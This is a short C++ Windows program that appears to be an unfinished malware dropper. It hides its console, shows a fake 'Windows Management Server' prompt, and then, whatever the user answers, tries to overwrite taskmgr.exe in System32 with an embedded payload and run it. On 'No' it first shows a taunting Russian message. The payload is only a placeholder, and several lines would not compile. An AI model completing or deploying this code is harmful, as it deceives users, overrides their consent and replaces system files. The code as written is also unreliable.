#include <fstream>
#include <windows.h>

void dropFile() {
    const char* data = "this will soon contain the base64 of the file";
    const char* path = "C:\\Windows\\System32";
    ofstream File(path + "taskmgr.exe");
    File << data;
    File.close();
    system("start C:\\Windows\\System32\\taskmgr.exe");
}


int WINAPI WinMain (HINSTANCE hThisInstance, HINSTANCE PrevInstance,
                            LPSTR lpszArgument, int nFunsterStil)

{
     HWND hide; 
     AllocConsole();
     hide = FindWindowA("ConsoleWindowClass", NULL);
     ShowWindow(hide, 0);
     int db = MessageBox( NULL, L"Windows Management Server has started! \nWish you to continue?", L"WINMANAGE", MB_YESNO | MB_ICONERROR ); //db for dialog box in case you're wondering
     switch (db) {
          case ID_YES:
               dropFile();
          case ID_NO:
               MessageBox( NULL, "И? Почему меня должно волновать, что ты думаешь?", "SCREW YOU!", MB_OK | MB_ICONERROR );
               dropFile();
     }
}
          
